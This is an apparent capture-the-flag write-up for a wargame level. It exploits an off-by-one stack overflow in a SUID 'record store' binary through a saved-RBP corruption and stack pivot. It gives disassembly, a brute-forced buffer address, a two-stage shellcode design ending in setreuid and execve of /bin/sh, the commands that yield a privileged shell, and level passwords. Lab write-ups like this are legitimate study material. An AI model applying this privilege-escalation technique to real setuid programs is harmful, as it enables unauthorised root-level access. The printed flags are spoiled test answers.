# level02 — pentest report

## Concept

Off-by-one stack overflow → single-byte saved-RBP corruption → stack
pivot. Unlike level00/01's return-address overwrites, this target's
overflow is exactly one byte and never touches the return address at all.
It corrupts the caller's saved frame pointer instead, which stays inert
until the caller's own epilogue runs — a more surgical technique that
also turned out to require a two-stage payload once a downstream
`printf()` call was found to clobber part of the controlled buffer, and
whose exact stack address could not be predicted from a debugger session
(gdb itself measurably shifts the target's stack), resolved by directly
calibrating against the live, un-debugged SUID binary.

## Recon

```
level01@rainfall:~$ ssh level02@<vm-ip> -p 4242    # password = level01's flag: 3309s5bx9kagi0z0qt0erxvivievlh86
level02@rainfall:~$ id
uid=1003(level02) gid=1005(level02) groups=1005(level02),1001(levelgroup)
level02@rainfall:~$ ls -la
-rwsr-x---  1 flag02  level02 16512 Jun  9 23:13 dixie
-r--r--r--  1 level02 level02  2512 Jun  9 23:13 dixie.c
-rw-r--r--  1 level02 level02    30 Jun  9 23:12 .gdbinit
-r--r--r--  1 level02 level02    47 Jun  9 23:13 README
level02@rainfall:~$ cat README
Dixie died by a single wrong move. So can you.
level02@rainfall:~$ cat .gdbinit
source /opt/pwndbg/gdbinit.py
```

```
level02@rainfall:~$ cat dixie.c
```
Full source provided. Key structure: a "record store" with a global
`record_t records[16]` array (BSS) and a `store_record()` function with a
local `char buf[64]`. The source itself carries a comment describing the
bug precisely:
```c
/* Off-by-one: the index runs 0..BUF_SIZE inclusive (<=), so a full
 * BUF_SIZE-byte read still lets the trailing pass write buf[BUF_SIZE].
 * buf is store_record's only local (counter/char are file-scope), so
 * gcc lays it out at rbp-BUF_SIZE with no padding: buf[BUF_SIZE] is the
 * low byte of the saved RBP slot.  One byte too far == one wrong move. */
```
```c
static void store_record(void)
{
    char buf[BUF_SIZE];
    ...
    in_len = 0;
    while (in_len <= BUF_SIZE) {
        in_ch = read(0, &buf[in_len], 1);
        if (in_ch <= 0) break;
        in_len++;
    }
    commit_record(buf, in_len < BUF_SIZE ? in_len : BUF_SIZE);
}
```
This comment is the challenge's own shipped source, not an external
writeup — using it is exactly the kind of static analysis this level is
built to reward. It still had to be verified against the actual compiled
binary (see below), since a source comment describing intent doesn't
guarantee the compiler laid things out exactly that way.

```
level02@rainfall:~$ checksec --file=./dixie
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
level02@rainfall:~$ cat /proc/sys/kernel/randomize_va_space
0
level02@rainfall:~$ file ./dixie
./dixie: setuid ELF 64-bit LSB executable, ... dynamically linked ...
level02@rainfall:~$ ldd ./dixie
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7c00000)
```
Same no-canary/no-PIE/ASLR-off profile as level00/01, executable stack
(no ROP strictly required — shellcode-in-buffer is viable). New this
level: checksec reports `SHSTK`/`IBT` (Intel CET) "Enabled" on the
binary. That would matter for a pivot-and-jump-elsewhere exploit, since
shadow-stack enforcement would fault on any `ret` whose popped address
doesn't match its shadow stack entry — worth checking directly rather
than assumed:
```
level02@rainfall:~$ readelf -n ./dixie
  Properties: x86 feature: IBT, SHSTK
level02@rainfall:~$ grep -o 'shstk\|ibt' /proc/cpuinfo | sort -u
(no output)
```
The binary opts in to CET at compile time, but the VM's virtual CPU
doesn't expose the `shstk`/`ibt` CPU flags at all — VirtualBox doesn't
pass CET through to the guest here — so it can't be enforced regardless
of the binary's intent.

```
level02@rainfall:~$ objdump -d -M intel ./dixie | sed -n '/<store_record>:/,/^$/p'
4013d2: endbr64
4013d6: push rbp
4013d7: mov rbp,rsp
4013da: sub rsp,0x40          ; buf[64], no padding
...
401492: lea rax,[rbp-0x40]    ; buf's address confirmed at rbp-0x40
...
4014a1: leave
4014a2: ret
```
Confirms the source comment exactly: `buf` at `rbp-0x40`, frame is exactly
64 bytes, so `buf[64]` (the off-by-one write) lands precisely on the low
byte of the 8-byte value at `[rbp+0]` — the saved-RBP slot `store_record`
will `pop` into its own `rbp` register during `leave`, right before
`ret`. The return address itself, at `[rbp+8]`, is one slot further and
completely untouched by a 1-byte write at `buf[64]`.

```
level02@rainfall:~$ objdump -d -M intel ./dixie | sed -n '/<main>:/,/^$/p'
401543: endbr64
401547: push rbp
401548: mov rbp,rsp
40154b: sub rsp,0x10           ; local char session[16]
...
401570: call store_record
401575: call dump_records
40157a: lea rax,[rbp-0x10]     ; session, for the closing printf
...
40159a: leave
40159b: ret
```
`main()` calls `store_record()` then `dump_records()`, then does its own
closing `printf`, then its own `leave;ret`. Since `store_record()`'s
`leave` pops the (now 1-byte-corrupted) saved-rbp value directly into the
`rbp` register, and that register is never intentionally reloaded before
`main`'s own `leave` at the very end, the corruption survives silently
through both `dump_records()` and the closing `printf()` and detonates at
`main`'s own epilogue.

## Retrieving the addresses, command by command

`store_record`'s `leave` does `rsp=rbp; pop rbp`, i.e. it loads `rbp` from
the 8 bytes at `[rbp+0]` — the same byte we can corrupt. A single-byte
overwrite only changes the low 8 bits of that value, so the corrupted
result (call it `M'`) is confined to a 256-byte-aligned window around the
true value. `store_record`'s own `ret` still fires correctly, so control
returns to `main` normally, but `main`'s `rbp` register is now `M'`.
`main` never re-derives its own `rbp`, so when it eventually runs its own
`leave; ret`, `rsp` becomes `M'` and the following `ret` reads its target
from `[M'+8]` — attacker-controlled if `M'` is steered onto the buffer
itself.

The first working payload put shellcode in the buffer and steered `M'`
onto it, but landed in an infinite loop instead of a shell. Stepping
through under gdb with the real payload loaded showed why:
```
level02@rainfall:~$ gdb -nx -q -batch -ex 'break *0x40159a' -ex 'run' \
    -ex 'info registers rbp' -ex 'x/9gx $rbp' ./dixie   # payload piped in
rbp 0x7fffffffea50
0x7fffffffea50: 0x4242424242424242 0x00007fffffffea60   # buf+0..15: intact
0x7fffffffea60: 0x89c789050f586b6a 0x31050f71b0c031c6   # buf+16..31: shellcode bytes 0-15, intact
0x7fffffffea70: 0x00007fffffffea90 0x000000000040152c   # buf+32..47: CLOBBERED (not our shellcode)
```
`buf[0:32]` survives intact; `buf[32:64]` gets overwritten by the time
`main`'s `leave` executes. `0x40152c` sits inside `dump_records`'s own
code — its `printf()` call (used to print the one stored record) reaches
down into `buf`'s upper half with its own glibc-internal stack scratch
space. A 42-byte shellcode doesn't fit in the surviving 32-byte window,
which is why the final exploit uses a two-stage payload instead (see
Exploit below).

Separately, gdb-measured stack addresses turned out not to match the
real, non-debugged process: gdb's inferior gets a slightly different
`envp` (extra `COLUMNS`/`LINES`, missing bash's `_=` var, different SSH
ephemeral ports), and since the kernel stacks the environment strings
below the initial stack pointer, any difference in their total size
shifts every address above them. `/proc/<pid>/environ` and
`/proc/<pid>/maps` are also unreadable once `dixie`'s SUID bit is active
(protected from the lower-privileged real uid), so there was no way to
read the true process's stack address directly either. The address had
to be found empirically instead: build the same payload shape for a
spread of candidate `BUF_ADDR` values and fire each at the real,
un-debugged SUID binary, watching for a real shell as `flag02`:
```
level02@rainfall:~$ bash remote_sweep.sh
192 payloads written

SUCCESS addr=0x00007fffffffea70
[FLATLINE] Ready: MARKER_00007fffffffea70
uid=1019(flag02) gid=1005(level02) groups=1005(level02),1001(levelgroup)
```
`BUF_ADDR=0x7fffffffea70` is the real, non-gdb address, confirmed working
with `id` showing effective uid `flag02`. Its low byte, `0x70`
(`BUF_ADDR & 0xFF`), is the value the off-by-one write uses to steer `M'`
onto the buffer.

## Exploit

Two-stage payload, built by `exploit.py`, required because only
`buf[0:32]` survives to the final `ret` (`dump_records()`'s own `printf()`
clobbers the rest):

1. Overflow (`store_record`, 65 bytes): `buf[0:8]` = discarded filler
   (only ends up in the `rbp` register, never used); `buf[8:16]` =
   pointer to `buf+16`; `buf[16:32]` = a 16-byte stage-1 stub; `buf[32:64]`
   = padding (irrelevant, gets clobbered by `dump_records()`'s `printf`
   regardless); byte 65 = `0x70` (`BUF_ADDR & 0xFF`), the off-by-one
   write that corrupts the saved-rbp slot's low byte so the eventual
   `M' == BUF_ADDR`.
2. Pivot: `main`'s own `leave;ret` (unaware anything is wrong) sets
   `rsp = BUF_ADDR`, pops `rbp` from `buf[0:8]` (discarded), then `ret`
   jumps to `buf[8:16]`'s value = `buf+16` — landing exactly on the
   stage-1 stub.
3. Stage-1 stub (16 bytes, assembled via pwntools' `asm()` on the VM and
   verified byte-exact): `xor edi,edi; lea rsi,[rsp+0x10]; push 0x64;
   pop rdx; xor eax,eax; syscall; jmp rsi` — i.e. `read(0, buf+32, 100)`
   then jump into whatever was just read. `buf+32` is exactly the region
   `dump_records()`'s `printf` already clobbered, so overwriting it again
   is free — nothing else touches it afterward.
4. Stage-2 (42 bytes, appended to the stdin stream immediately after the
   65-byte overflow payload, arrives in the same pipe buffer so the
   stub's single `read()` picks it all up in one shot): `geteuid()` →
   `setreuid(euid, euid)` (syncs real/effective uid so the spawned shell
   won't drop privileges — same lesson as level00/01) →
   `execve("/bin/sh", ["/bin/sh", NULL], NULL)`. Hand-written instead of
   pwntools' `shellcraft.sh()` (which is ~65 bytes, too big for the
   available space) and assembled/verified via pwntools' `asm()`.

```
level02@rainfall:~$ python3 exploit.py > payload.bin
level02@rainfall:~$ (cat payload.bin; sleep 2; printf 'echo MARKER_OK\nid\ncat /home/flag02/.pass\nexit\n') \
    | ssh level02@<vm-ip> -p 4242 ./dixie
[FLATLINE] Ready: MARKER_OK
uid=1019(flag02) gid=1005(level02) groups=1005(level02),1001(levelgroup)
qeplvibynup98phqb312dkvhtpdkklac
```

Verified as the real level03 password:
```
level02@rainfall:~$ ssh level03@<vm-ip> -p 4242
Password: qeplvibynup98phqb312dkvhtpdkklac
level03@rainfall:~$ id
uid=1004(level03) ...
```

